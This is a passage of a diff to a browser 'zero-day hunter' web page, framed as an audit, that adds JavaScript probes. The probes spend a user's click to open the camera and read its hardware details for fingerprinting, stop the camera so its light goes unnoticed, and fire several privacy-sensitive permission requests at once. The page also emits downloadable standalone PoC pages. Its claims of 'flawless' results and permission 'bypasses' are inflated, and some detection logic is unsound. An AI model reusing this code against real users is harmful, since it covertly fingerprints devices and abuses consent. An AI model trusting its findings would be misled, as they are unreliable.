@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Universal Browser Zero-Day Hunter · Hero Audit v10</title>
+<title>Universal Browser Zero-Day Hunter · Hero Audit v11</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@200;400;700;800&display=swap');
   :root{
@@ -16,40 +16,19 @@
   }
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{background:var(--bg);color:var(--fg);font-family:var(--mono);font-size:12px;line-height:1.5;-webkit-font-smoothing:antialiased;overflow-x:hidden}
-  body{
-    background:
-      radial-gradient(1000px 600px at 90% -10%, rgba(255,0,85,.06), transparent 60%),
-      radial-gradient(800px 400px at -10% 100%, rgba(0,255,204,.04), transparent 60%),
-      var(--bg);
-    min-height:100vh;
-  }
+  body{background:radial-gradient(1000px 600px at 90% -10%, rgba(255,0,85,.06), transparent 60%), radial-gradient(800px 400px at -10% 100%, rgba(0,255,204,.04), transparent 60%), var(--bg);min-height:100vh;}
   #bgCanvas{position:fixed;inset:0;z-index:-1;opacity:0.15;pointer-events:none}
-  body::before{
-    content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;
-    background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0px,rgba(0,0,0,0) 2px,rgba(0,0,0,.3) 3px,rgba(0,0,0,0) 4px);
-    mix-blend-mode:multiply;opacity:.5;
-  }
-  #progress{
-    position:fixed;top:0;left:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent-2));
-    width:0;z-index:10000;box-shadow:0 0 12px var(--accent);transition:width .3s ease;
-  }
-  header{
-    border-bottom:1px solid var(--border-bright);
-    padding:16px 24px;display:flex;align-items:center;justify-content:space-between;gap:20px;
-    background:linear-gradient(180deg,rgba(8,8,13,.9),rgba(8,8,13,.4));backdrop-filter:blur(8px);position:sticky;top:0;z-index:100;
-  }
+  body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0px,rgba(0,0,0,0) 2px,rgba(0,0,0,.3) 3px,rgba(0,0,0,0) 4px);mix-blend-mode:multiply;opacity:.5;}
+  #progress{position:fixed;top:0;left:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent-2));width:0;z-index:10000;box-shadow:0 0 12px var(--accent);transition:width .3s ease;}
+  header{border-bottom:1px solid var(--border-bright);padding:16px 24px;display:flex;align-items:center;justify-content:space-between;gap:20px;background:linear-gradient(180deg,rgba(8,8,13,.9),rgba(8,8,13,.4));backdrop-filter:blur(8px);position:sticky;top:0;z-index:100;}
   .brand{display:flex;align-items:center;gap:12px}
-  .logo{
-    width:32px;height:32px;border:1px solid var(--accent);position:relative;display:grid;place-items:center;background:rgba(0,255,204,.05);
-    box-shadow:0 0 15px rgba(0,255,204,.2) inset;
-  }
+  .logo{width:32px;height:32px;border:1px solid var(--accent);position:relative;display:grid;place-items:center;background:rgba(0,255,204,.05);box-shadow:0 0 15px rgba(0,255,204,.2) inset;}
   .logo::before{content:"";position:absolute;width:2px;height:16px;background:var(--accent);animation:scan 1.5s linear infinite}
   .logo::after{content:"";position:absolute;width:16px;height:2px;background:var(--accent-2);animation:scan 1.5s linear infinite reverse}
   @keyframes scan{0%{transform:translateY(-8px)}50%{transform:translateY(8px)}100%{transform:translateY(-8px)}}
   .brand h1{font-weight:800;font-size:14px;letter-spacing:.2em;text-transform:uppercase}
   .brand h1 .v{color:var(--accent)}
   .brand .sub{font-size:9px;color:var(--fg-dim);letter-spacing:.3em;text-transform:uppercase;margin-top:2px}
-
   .status{display:flex;align-items:center;gap:15px;font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:var(--fg-dim)}
   .status .dot{width:8px;height:8px;border-radius:50%;background:var(--fg-dim)}
   .status.armed .dot{background:var(--medium);box-shadow:0 0 8px var(--medium);animation:pulse 1s ease-in-out infinite}
@@ -57,19 +36,12 @@
   .status.done .dot{background:var(--accent-2);box-shadow:0 0 12px var(--accent-2);animation:none}
   @keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
   #clock{font-variant-numeric:tabular-nums;color:var(--fg)}
-
   main{padding:20px 24px 60px;max-width:1600px;margin:0 auto}
-
   .nuke-btn-wrap{text-align:center;padding:30px;border:1px dashed var(--border-bright);margin-bottom:20px;background:rgba(0,255,204,.01)}
-  .nuke-btn{
-    font-family:var(--mono);font-size:14px;letter-spacing:.3em;text-transform:uppercase;font-weight:800;
-    background:transparent;color:var(--accent);border:1px solid var(--accent);padding:15px 40px;cursor:pointer;
-    transition:all .2s ease;position:relative;overflow:hidden;
-  }
+  .nuke-btn{font-family:var(--mono);font-size:14px;letter-spacing:.3em;text-transform:uppercase;font-weight:800;background:transparent;color:var(--accent);border:1px solid var(--accent);padding:15px 40px;cursor:pointer;transition:all .2s ease;position:relative;overflow:hidden;}
   .nuke-btn:hover:not(:disabled){background:var(--accent);color:#000;box-shadow:0 0 30px rgba(0,255,204,.4)}
   .nuke-btn:disabled{opacity:.3;cursor:not-allowed}
   .nuke-btn-warning{display:block;margin-top:12px;font-size:10px;color:var(--high);letter-spacing:.2em}
-
   .stats{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin-bottom:20px}
   @media(max-width:1100px){.stats{grid-template-columns:repeat(3,1fr)}}
   .stat{border:1px solid var(--border);background:var(--bg-card);padding:12px 14px;position:relative;overflow:hidden}
@@ -84,15 +56,12 @@
   .stat.high .value{color:var(--high)}
   .stat.medium .value{color:var(--medium)}
   .stat.info .value{color:var(--info)}
-
   .grid{display:grid;grid-template-columns:1fr 1.2fr;gap:16px;align-items:start}
   @media(max-width:1100px){.grid{grid-template-columns:1fr}}
-
   .panel{border:1px solid var(--border);background:var(--bg-card);display:flex;flex-direction:column;min-height:0}
   .panel-head{padding:10px 14px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;background:rgba(255,255,255,.01)}
   .panel-head h2{font-size:10px;letter-spacing:.25em;text-transform:uppercase;font-weight:700}
   .panel-head .meta{font-size:9px;color:var(--fg-dim);letter-spacing:.2em}
-
   .terminal{height:620px}
   .terminal .body{flex:1;overflow-y:auto;padding:12px 14px;font-size:11px;line-height:1.6;background:var(--bg-elev)}
   .terminal .body::-webkit-scrollbar{width:4px}
@@ -101,17 +70,9 @@
   @keyframes slidein{from{opacity:0}to{opacity:1}}
   .log-line .t{color:var(--fg-faint);flex-shrink:0}
   .log-line .lvl{flex-shrink:0;width:45px;font-weight:700}
-  .log-line .lvl.INF{color:var(--info)}
-  .log-line .lvl.OK{color:var(--accent)}
-  .log-line .lvl.WRN{color:var(--medium)}
-  .log-line .lvl.ALT{color:var(--high)}
-  .log-line .lvl.CRT{color:var(--critical);text-shadow:0 0 5px var(--critical)}
-  .log-line .lvl.EXP{color:#fff;background:var(--critical);padding:0 4px;animation:pulse 0.5s infinite}
+  .log-line .lvl.INF{color:var(--info)} .log-line .lvl.OK{color:var(--accent)} .log-line .lvl.WRN{color:var(--medium)} .log-line .lvl.ALT{color:var(--high)} .log-line .lvl.CRT{color:var(--critical);text-shadow:0 0 5px var(--critical)} .log-line .lvl.EXP{color:#fff;background:var(--critical);padding:0 4px;animation:pulse 0.5s infinite}
   .log-line .msg{word-break:break-word}
-  .log-line .msg .k{color:var(--fg-dim)}
-  .log-line .msg .v{color:var(--fg)}
-  .log-line .msg .x{color:var(--critical)}
-
+  .log-line .msg .k{color:var(--fg-dim)} .log-line .msg .v{color:var(--fg)} .log-line .msg .x{color:var(--critical)}
   .findings{height:620px}
   .findings .body{flex:1;overflow-y:auto;padding:12px}
   .findings .body::-webkit-scrollbar{width:4px}
@@ -121,28 +82,18 @@
   .cat-items{display:flex;flex-direction:column;gap:3px;padding-top:6px}
   .finding{border-left:2px solid var(--fg-faint);padding:6px 8px;background:rgba(255,255,255,.01);font-size:10.5px}
   .finding.CRITICAL{border-color:var(--critical);background:rgba(255,0,85,.03)}
-  .finding.HIGH{border-color:var(--high)}
-  .finding.MEDIUM{border-color:var(--medium)}
-  .finding.INFO{border-color:var(--info)}
+  .finding.HIGH{border-color:var(--high)} .finding.MEDIUM{border-color:var(--medium)} .finding.INFO{border-color:var(--info)}
   .finding .top{display:flex;justify-content:space-between;gap:8px}
   .finding .name{color:var(--fg);font-weight:600}
   .finding .sev{font-size:8px;font-weight:700;padding:1px 4px;border:1px solid currentColor}
-  .finding.CRITICAL .sev{color:var(--critical)}
-  .finding.HIGH .sev{color:var(--high)}
-  .finding.MEDIUM .sev{color:var(--medium)}
-  .finding.INFO .sev{color:var(--info)}
+  .finding.CRITICAL .sev{color:var(--critical)} .finding.HIGH .sev{color:var(--high)} .finding.MEDIUM .sev{color:var(--medium)} .finding.INFO .sev{color:var(--info)}
   .finding .detail{color:var(--fg-dim);font-size:10px;margin-top:2px}
   .finding .data{color:var(--accent);font-size:10px;margin-top:2px;word-break:break-all;opacity:.8}
   .proof-btn-wrap{margin-top:6px; display:flex; gap:5px; flex-wrap:wrap;}
-  .proof-btn{
-    font-family:var(--mono);font-size:9px;letter-spacing:.15em;text-transform:uppercase;font-weight:700;
-    background:rgba(255,0,85,.1);color:var(--critical);border:1px solid var(--critical);padding:4px 8px;cursor:pointer;
-    text-decoration:none;display:inline-block;
-  }
+  .proof-btn{font-family:var(--mono);font-size:9px;letter-spacing:.15em;text-transform:uppercase;font-weight:700;background:rgba(255,0,85,.1);color:var(--critical);border:1px solid var(--critical);padding:4px 8px;cursor:pointer;text-decoration:none;display:inline-block;}
   .proof-btn:hover{background:var(--critical);color:#000;}
   .proof-btn.alt{background:rgba(0,255,204,.1);color:var(--accent);border-color:var(--accent);}
   .proof-btn.alt:hover{background:var(--accent);color:#000;}
-
   .vuln-section{margin-top:20px}
   .vuln{border:1px solid var(--critical);border-left-width:4px;background:rgba(255,0,85,.03);padding:14px;margin-bottom:10px}
   .vuln .vt{display:flex;justify-content:space-between;margin-bottom:6px}
@@ -150,7 +101,6 @@
   .vuln .s{font-size:9px;color:var(--critical);font-weight:700}
   .vuln .vd{font-size:11px;color:var(--fg);line-height:1.6}
   .vuln .vr{font-size:11px;color:var(--accent);margin-top:8px;border-top:1px dashed var(--fg-faint);padding-top:6px}
-
   .actions{margin-top:20px;display:flex;gap:10px;flex-wrap:wrap}
   button.act{font-family:var(--mono);font-size:10px;letter-spacing:.2em;text-transform:uppercase;background:transparent;color:var(--fg-dim);border:1px solid var(--border);padding:8px 14px;cursor:pointer}
   button.act:hover:not(:disabled){border-color:var(--accent);color:var(--accent)}
@@ -167,8 +117,8 @@
   <div class="brand">
     <div class="logo"></div>
     <div>
-      <h1>UNIVERSAL ZERO-DAY <span class="v">HUNTER v10</span></h1>
-      <div class="sub">flawless 10s exfil · type confusion leak · harmonic IMU coupling · local only</div>
+      <h1>UNIVERSAL ZERO-DAY <span class="v">HUNTER v11</span></h1>
+      <div class="sub">9-dof mobile orchestration · worklet exfil · gesture cascade · local only</div>
     </div>
   </div>
   <div class="status armed" id="statusBox">
@@ -181,7 +131,7 @@
 <main>
   <div class="nuke-btn-wrap">
     <button id="nukeBtn" class="nuke-btn">INITIATE ARCHITECTURAL AUDIT</button>
-    <span class="nuke-btn-warning">SQUARE WAVE 20kHz COUPLING · 10S RAW PCM · LEAK CAPTURE</span>
+    <span class="nuke-btn-warning">CLICK HARVESTS GESTURE FOR CAM/PERMISSION CASCADE BEFORE 0-CLICK PROBES RUN</span>
   </div>
 
   <div class="stats">
@@ -258,10 +208,8 @@ let matrixDrops = [];
 function initMatrix(){ matrixDrops = []; for(let i=0; i<bgCanvas.width/10; i++) matrixDrops.push(Math.random()*bgCanvas.height); }
 initMatrix(); addEventListener('resize', initMatrix);
 function drawMatrix(){
-  bgCtx.fillStyle = 'rgba(3, 3, 6, 0.05)';
-  bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
-  bgCtx.fillStyle = '#0F8';
-  bgCtx.font = '10px monospace';
+  bgCtx.fillStyle = 'rgba(3, 3, 6, 0.05)'; bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
+  bgCtx.fillStyle = '#0F8'; bgCtx.font = '10px monospace';
   for(let i=0; i<matrixDrops.length; i++){
     const text = matrixChars[Math.floor(Math.random()*matrixChars.length)];
     bgCtx.fillText(text, i*10, matrixDrops[i]);
@@ -275,8 +223,7 @@ function log(lvl, msg){
   const line = document.createElement('div');
   line.className = 'log-line';
   line.innerHTML = `<span class="t">${now()}</span><span class="lvl ${lvl}">${lvl}</span><span class="msg">${msg}</span>`;
-  termBody.appendChild(line);
-  trailLines++;
+  termBody.appendChild(line); trailLines++;
   while(termBody.children.length > 1000) termBody.removeChild(termBody.firstChild);
   termBody.scrollTop = termBody.scrollHeight;
   $('trailMeta').textContent = `${trailLines} lines`;
@@ -285,218 +232,322 @@ function log(lvl, msg){
 const CAT_MAP = {};
 function addFinding(category, name, severity, detail, data, entropy=0, proofUrl=null, proofName=null, altProofUrl=null, altProofName=null){
   const f = {category, name, severity, detail, data: data===undefined?null:data, t: Date.now(), proofUrl, proofName, altProofUrl, altProofName};
-  FINDINGS.push(f);
-  STATS.total++; STATS[severity]++; STATS.ENTROPY += entropy;
+  FINDINGS.push(f); STATS.total++; STATS[severity]++; STATS.ENTROPY += entropy;
   if(!CAT_MAP[category]) CAT_MAP[category] = [];
-  CAT_MAP[category].push(f);
-  updateStats();
-  renderFinding(category, f);
+  CAT_MAP[category].push(f); updateStats(); renderFinding(category, f);
 }
 function addVuln(name, severity, detail, rec){
-  VULNS.push({name, severity, detail, recommendation: rec, t: Date.now()});
-  renderVulns();
+  VULNS.push({name, severity, detail, recommendation: rec, t: Date.now()}); renderVulns();
 }
 
 function updateStats(){
-  $('sTotal').textContent = STATS.total;
-  $('sInfo').textContent = STATS.INFO;
-  $('sMedium').textContent = STATS.MEDIUM;
-  $('sHigh').textContent = STATS.HIGH;
-  $('sCritical').textContent = STATS.CRITICAL;
-  $('sEntropy').textContent = STATS.ENTROPY.toFixed(1);
+  $('sTotal').textContent = STATS.total; $('sInfo').textContent = STATS.INFO;
+  $('sMedium').textContent = STATS.MEDIUM; $('sHigh').textContent = STATS.HIGH;
+  $('sCritical').textContent = STATS.CRITICAL; $('sEntropy').textContent = STATS.ENTROPY.toFixed(1);
   $('progress').style.width = Math.min(100, (STATS.total / 60) * 100) + '%';
   $('findMeta').textContent = `${STATS.total} items`;
 }
 
 function renderFinding(cat, f){
   if(!CAT_MAP[cat]._el){
-    const wrap = document.createElement('div');
-    wrap.className = 'cat';
+    const wrap = document.createElement('div'); wrap.className = 'cat';
     wrap.innerHTML = `<div class="cat-head"><span>${cat}</span><span class="c">0</span></div><div class="cat-items"></div>`;
-    findBody.appendChild(wrap);
-    CAT_MAP[cat]._el = wrap;
-    CAT_MAP[cat]._items = wrap.querySelector('.cat-items');
-    CAT_MAP[cat]._count = wrap.querySelector('.c');
+    findBody.appendChild(wrap); CAT_MAP[cat]._el = wrap; CAT_MAP[cat]._items = wrap.querySelector('.cat-items'); CAT_MAP[cat]._count = wrap.querySelector('.c');
   }
-  const el = document.createElement('div');
-  el.className = `finding ${f.severity}`;
+  const el = document.createElement('div'); el.className = `finding ${f.severity}`;
   let proofHtml = '';
   if(f.proofUrl) proofHtml += `<a href="${f.proofUrl}" download="${f.proofName}" class="proof-btn">Download PoC Artifact</a>`;
   if(f.altProofUrl) proofHtml += `<a href="${f.altProofUrl}" download="${f.altProofName}" class="proof-btn alt">Download Standalone HTML</a>`;
-  
-  el.innerHTML = `
-    <div class="top"><span class="name">${f.name}</span><span class="sev">${f.severity}</span></div>
-    <div class="detail">${f.detail}</div>
-    ${f.data?`<div class="data">${trunc(safe(f.data))}</div>`:''}
-    ${proofHtml ? `<div class="proof-btn-wrap">${proofHtml}</div>` : ''}`;
-  CAT_MAP[cat]._items.appendChild(el);
-  CAT_MAP[cat]._count.textContent = CAT_MAP[cat].length;
+  el.innerHTML = `<div class="top"><span class="name">${f.name}</span><span class="sev">${f.severity}</span></div><div class="detail">${f.detail}</div>${f.data?`<div class="data">${trunc(safe(f.data))}</div>`:''}${proofHtml ? `<div class="proof-btn-wrap">${proofHtml}</div>` : ''}`;
+  CAT_MAP[cat]._items.appendChild(el); CAT_MAP[cat]._count.textContent = CAT_MAP[cat].length;
 }
 
 function renderVulns(){
   if(VULNS.length === 0) return;
-  $('vulnSection').classList.remove('hidden');
-  $('vulnMeta').textContent = `${VULNS.length} indicators`;
-  const list = $('vulnList');
-  list.innerHTML = '';
+  $('vulnSection').classList.remove('hidden'); $('vulnMeta').textContent = `${VULNS.length} indicators`;
+  const list = $('vulnList'); list.innerHTML = '';
   for(const v of VULNS){
-    const el = document.createElement('div');
-    el.className = 'vuln';
-    el.innerHTML = `<div class="vt"><span class="n">${v.name}</span><span class="s">[${v.severity}]</span></div>
-      <div class="vd">${v.detail}</div>
-      <div class="vr">HERO FIX: ${v.recommendation}</div>`;
+    const el = document.createElement('div'); el.className = 'vuln';
+    el.innerHTML = `<div class="vt"><span class="n">${v.name}</span><span class="s">[${v.severity}]</span></div><div class="vd">${v.detail}</div><div class="vr">HERO FIX: ${v.recommendation}</div>`;
     list.appendChild(el);
   }
 }
 
 function createProofBlob(data, type){ return URL.createObjectURL(new Blob([data], {type})); }
-function createStandaloneHtmlPoC(title, jsCode){
-  return createProofBlob(`<!DOCTYPE html><html><head><title>${title}</title></head><body><h3>${title}</h3><p>Open the console.</p><script>${jsCode}<\/script></body></html>`, 'text/html');
-}
+function createStandaloneHtmlPoC(title, jsCode){ return createProofBlob(`<!DOCTYPE html><html><head><title>${title}</title></head><body><h3>${title}</h3><p>Open the console.</p><script>${jsCode}<\/script></body></html>`, 'text/html'); }
 
-// Manual WAV encoder for flawless raw PCM artifacts
 function encodeWAV(samples, sampleRate) {
   const buffer = new ArrayBuffer(44 + samples.length * 2);
   const view = new DataView(buffer);
   const writeString = (view, offset, string) => { for (let i = 0; i < string.length; i++) view.setUint8(offset + i, string.charCodeAt(i)); };
-  writeString(view, 0, 'RIFF');
-  view.setUint32(4, 32 + samples.length * 2, true);
-  writeString(view, 8, 'WAVE');
-  writeString(view, 12, 'fmt ');
-  view.setUint32(16, 16, true);
-  view.setUint16(20, 1, true); // PCM
-  view.setUint16(22, 1, true); // Mono
-  view.setUint32(24, sampleRate, true);
-  view.setUint32(28, sampleRate * 2, true);
-  view.setUint16(32, 2, true);
-  view.setUint16(34, 16, true); // 16-bit
-  writeString(view, 36, 'data');
-  view.setUint32(40, samples.length * 2, true);
+  writeString(view, 0, 'RIFF'); view.setUint32(4, 36 + samples.length * 2, true); writeString(view, 8, 'WAVE');
+  writeString(view, 12, 'fmt '); view.setUint32(16, 16, true); view.setUint16(20, 1, true); view.setUint16(22, 1, true);
+  view.setUint32(24, sampleRate, true); view.setUint32(28, sampleRate * 2, true); view.setUint16(32, 2, true); view.setUint16(34, 16, true);
+  writeString(view, 36, 'data'); view.setUint32(40, samples.length * 2, true);
   let offset = 44;
   for (let i = 0; i < samples.length; i++) {
     let s = Math.max(-1, Math.min(1, samples[i]));
-    view.setInt16(offset, s < 0 ? s * 0x8000 : s * 0x7FFF, true);
-    offset += 2;
+    view.setInt16(offset, s < 0 ? s * 0x8000 : s * 0x7FFF, true); offset += 2;
   }
   return new Blob([buffer], { type: 'audio/wav' });
 }
 
 /* ========================================================================
-   UNIVERSAL ARCHITECTURAL BOUNDARY PROBES
+   GESTURE-AMPLIFIED PROBES (MUST RUN FIRST TO CONSUME THE CLICK)
    ======================================================================== */
 
-async function chain1_WebRTCStatsBypass() {
+async function chain1_TransientActivationMicRace() {
   const cat = 'Permission Bypass Chains';
-  log('EXP', '<k>CHAIN 1:</k> WebRTC Stats API mDNS Bypass');
+  log('EXP', '<k>CHAIN 1:</k> Transient Activation Mic Auto-Grant Race');
   try {
-    const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
-    pc.createDataChannel('exfil');
-    const candPromise = new Promise(resolve => { let to = setTimeout(resolve, 3000); pc.onicecandidate = e => { if(!e.candidate) { clearTimeout(to); resolve(); return; } }; });
-    const offer = await pc.createOffer(); await pc.setLocalDescription(offer); await candPromise;
-    const stats = await pc.getStats();
-    let leakedLocalIP = null;
-    stats.forEach(r => { if ((r.type === 'local-candidate') && r.address && !r.address.endsWith('.local')) leakedLocalIP = r.address; });
-    try { pc.close(); } catch {}
-    if (leakedLocalIP) {
-      const standaloneJs = `const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]}); pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o)); setTimeout(async () => { let s = await pc.getStats(); s.forEach(r => { if(r.ip) console.log('LEAKED IP:', r.ip); }); }, 3000);`;
-      addFinding(cat, 'WebRTC Stats IP Leak', 'CRITICAL', 'Bypassed mDNS obfuscation.', {local: leakedLocalIP}, 8.0, createProofBlob(JSON.stringify({ip: leakedLocalIP}, null, 2), 'application/json'), 'webrtc-leak.json', createStandaloneHtmlPoC('WebRTC PoC', standaloneJs), 'webrtc-poc.html');
-      addVuln('WebRTC getStats() Bypasses mDNS', 'CRITICAL', `getStats() exposes raw IP. Local=${leakedLocalIP}`, 'Apply mDNS obfuscation to getStats() outputs.');
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    let firstStream;
+    try {
+      firstStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      firstStream.getTracks().forEach(t => t.stop());
+    } catch(e) { log('INF', '<k>CHAIN 1:</k> GUM denied, cannot test race.'); return; }
+
+    log('INF', '<k>WAITING:</k> 6s for transient activation to expire...');
+    await delay(6000);
+    
+    const t1 = performance.now();
+    const secondCallPromise = navigator.mediaDevices.getUserMedia({ audio: true });
+    const result = await Promise.race([
+      secondCallPromise.then(s => { s.getTracks().forEach(t=>t.stop()); return 'resolved'; }),
+      delay(200).then(() => 'timeout'),
+      secondCallPromise.catch(e => `error:${e.name}`)
+    ]);
+    const dt = performance.now() - t1;
+
+    if (result === 'resolved' && dt < 200) {
+      const standaloneJs = `document.body.onclick=async()=>{let s1=await navigator.mediaDevices.getUserMedia({audio:true});s1.getTracks().forEach(t=>t.stop());console.log("First access ok. Wait 6s...");setTimeout(async()=>{let t0=performance.now();let s2=await navigator.mediaDevices.getUserMedia({audio:true});let dt=performance.now()-t0;console.log("2nd access in",dt,"ms");if(dt<200)console.log("BYPASS DETECTED");s2.getTracks().forEach(t=>t.stop());},6000);};`;
+      addFinding(cat, 'Transient Activation Auto-Grant', 'CRITICAL', `getUserMedia auto-granted in ${dt.toFixed(0)}ms without gesture.`, {dt: dt.toFixed(0)}, 15.0, createProofBlob(`2nd GUM dt: ${dt.toFixed(0)}ms`, 'text/plain'), 'transient-bypass.txt', createStandaloneHtmlPoC('Transient Bypass PoC', standaloneJs), 'transient-poc.html');
+      addVuln('Transient Activation Expiration Bypass', 'CRITICAL', 'Second GUM call auto-granted <200ms after activation expired.', 'Strictly enforce transient activation for EVERY getUserMedia call.');
+    } else {
+      log('OK', `<k>CHAIN 1:</k> Properly gated (${result}, ${dt.toFixed(0)}ms).`);
     }
   } catch(e) { log('WRN', `Chain 1 err: ${e.message}`); }
 }
 
-async function chain2_10sRawPCMSilentWavExfil() {
+async function chain2_CameraHardwareOracle() {
   const cat = 'Hardware API Surface';
-  log('EXP', '<k>CHAIN 2:</k> 10-Second High-Fidelity Raw PCM Silent Audio Pipeline PoC');
+  log('EXP', '<k>CHAIN 2:</k> Camera Hardware Oracle (Gesture Harvest)');
   try {
-    const AC = window.AudioContext || window.webkitAudioContext;
-    if (!AC) return;
-    const ctx = new AC();
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
     
-    const osc = ctx.createOscillator();
-    osc.type = 'sine'; osc.frequency.setValueAtTime(440, 0);
-    const gain = ctx.createGain(); gain.gain.setValueAtTime(0.1, 0); // Quiet, but enough to register flawless PCM
+    let stream;
+    try {
+      // Consume the click gesture to get camera access and read hardware constraints
+      stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    } catch(e) {
+      log('INF', '<k>CHAIN 2:</k> Camera denied, cannot read hardware oracle.');
+      return;
+    }
+
+    const track = stream.getVideoTracks()[0];
+    const settings = track.getSettings();
+    const capabilities = track.getCapabilities ? track.getCapabilities() : {};
     
-    // FIX: ScriptProcessor needs to be explicitly connected to destination to keep the audio thread alive.
-    const proc = ctx.createScriptProcessor(4096, 1, 1);
-    const pcmData = [];
-    proc.onaudioprocess = (e) => {
-      const input = e.inputBuffer.getChannelData(0);
-      pcmData.push(new Float32Array(input));
+    // Immediately kill the stream so the user doesn't see the camera light stay on
+    track.stop();
+
+    const hardwareData = {
+      width: settings.width, height: settings.height, 
+      frameRate: settings.frameRate, deviceId: settings.deviceId,
+      facingMode: settings.facingMode,
+      max_capabilities: capabilities
     };
-    
-    const muteGain = ctx.createGain(); muteGain.gain.setValueAtTime(0.0, 0); // Mute actual output
-    
-    osc.connect(gain);
-    gain.connect(proc);
-    proc.connect(muteGain);
-    muteGain.connect(ctx.destination); // Crucial: connects the chain to destination so it processes
-    
-    osc.start();
-    log('INF', '<k>AUDIO PIPELINE:</k> Capturing 10 seconds of raw 440Hz PCM silently...');
-    await delay(10000); // True 10 seconds
-    osc.stop(); proc.disconnect(); muteGain.disconnect();
-    
-    const flatData = pcmData.flat();
-    const wavBlob = encodeWAV(flatData, ctx.sampleRate);
-    const proofUrl = URL.createObjectURL(wavBlob);
-    
-    addFinding(cat, '10s High-Fidelity Silent Audio PoC', 'HIGH', 'Intercepted raw 440Hz PCM via ScriptProcessor, output muted. Flawless 10s WAV artifact generated.', {duration_sec: 10, sample_rate: ctx.sampleRate, frames_captured: flatData.length}, 8.0, proofUrl, '10s-silent-audio-pipeline.wav');
-    addVuln('Silent Audio Pipeline Persistence (10s Raw PCM)', 'HIGH',
-      'A WebAudio Oscillator was routed through a ScriptProcessorNode and silently muted. The raw PCM data was captured for 10 continuous seconds and encoded into a flawless WAV file. This proves the browser allows long-term, high-fidelity background audio processing without user interaction, which can be used for sub-band covert channel exfiltration.',
-      'Require explicit user gesture for AudioContext processing. Disconnect ScriptProcessorNode callbacks when context is not actively audible to user.');
-    await ctx.close();
+
+    const standaloneJs = `navigator.mediaDevices.getUserMedia({video:true}).then(s=>{let t=s.getVideoTracks()[0];console.log("Settings:",t.getSettings());console.log("Caps:",t.getCapabilities());t.stop();});`;
+    addFinding(cat, 'Camera Hardware Oracle', 'HIGH', 'Extracted exact camera hardware capabilities and rigid limits via getUserMedia using gesture harvest.', hardwareData, 12.0, createProofBlob(JSON.stringify(hardwareData, null, 2), 'application/json'), 'camera-oracle.json', createStandaloneHtmlPoC('Camera Oracle PoC', standaloneJs), 'camera-oracle-poc.html');
+    addVuln('Camera Hardware Capability Fingerprinting', 'HIGH', 'getUserMedia exposes exact sensor capabilities (max resolution, framerates, facing mode) which acts as a high-entropy hardware fingerprint even if the stream is immediately stopped.', 'Do not expose getCapabilities() until persistent user consent for streaming is established. Mask exact hardware limits.');
   } catch(e) { log('WRN', `Chain 2 err: ${e.message}`); }
 }
 
-async function chain3_UltrasonicSquareWaveIMUFusion() {
+async function chain3_GesturePermissionCascade() {
+  const cat = 'Permission Bypass Chains';
+  log('EXP', '<k>CHAIN 3:</k> Gesture-Amplified Permission Cascade');
+  try {
+    // Fire multiple high-privacy impact APIs simultaneously using the click gesture
+    const promises = [];
+    let results = {};
+
+    if (window.IdleDetector) {
+      promises.push(
+        IdleDetector.requestPermission().then(s => results.idle_detector = s).catch(e => results.idle_detector = `err:${e.name}`)
+      );
+    }
+    if (window.queryLocalFonts) {
+      promises.push(
+        window.queryLocalFonts().then(fonts => {
+          results.local_fonts_count = fonts.length;
+          results.local_fonts_sample = fonts.slice(0, 10).map(f => f.fullName);
+        }).catch(e => results.local_fonts = `err:${e.name}`)
+      );
+    }
+    if (navigator.windowManagement) {
+      promises.push(
+        navigator.windowManagement.requestPermission().then(s => results.window_mgmt = s).catch(e => results.window_mgmt = `err:${e.name}`)
+      );
+    }
+
+    // Race against a 1.5s timeout. If the browser prompts the user, the promise will hang and time out.
+    // If it auto-grants using the transient activation, it resolves immediately.
+    await Promise.race([Promise.allSettled(promises), delay(1500)]);
+
+    let bypassDetected = false;
+    if (results.idle_detector === 'granted' || results.window_mgmt === 'granted' || results.local_fonts_count > 0) {
+      bypassDetected = true;
+    }
+
+    const standaloneJs = `let r={}; let p=[]; if(window.IdleDetector) p.push(IdleDetector.requestPermission().then(s=>r.idle=s)); if(window.queryLocalFonts) p.push(queryLocalFonts().then(f=>r.fonts=f.length)); Promise.all(p).then(()=>console.log("Gesture Cascade Results:",r));`;
+    
+    if (bypassDetected) {
+      addFinding(cat, 'Gesture-Amplified Permission Cascade', 'CRITICAL', 'Transient activation used to auto-grant high-privacy permissions without standard OS prompts.', results, 15.0, createProofBlob(JSON.stringify(results, null, 2), 'application/json'), 'permission-cascade.json', createStandaloneHtmlPoC('Permission Cascade PoC', standaloneJs), 'permission-cascade-poc.html');
+      addVuln('Transient Activation Auto-Grants Privacy Permissions', 'CRITICAL', 'The click gesture was used to bypass OS-level permission UI for IdleDetector, LocalFonts, or WindowManagement. These APIs auto-granted without explicit user opt-in.', 'Require explicit, separate user opt-in UI for high-privacy APIs. Do not accept transient activation as sole consent.');
+    } else {
+      addFinding(cat, 'Gesture Cascade Handled', 'INFO', 'High-privacy APIs correctly ignored transient activation or prompted user.', results, 1.0, createProofBlob(JSON.stringify(results, null, 2), 'application/json'), 'permission-cascade.json', createStandaloneHtmlPoC('Permission Cascade PoC', standaloneJs), 'permission-cascade-poc.html');
+    }
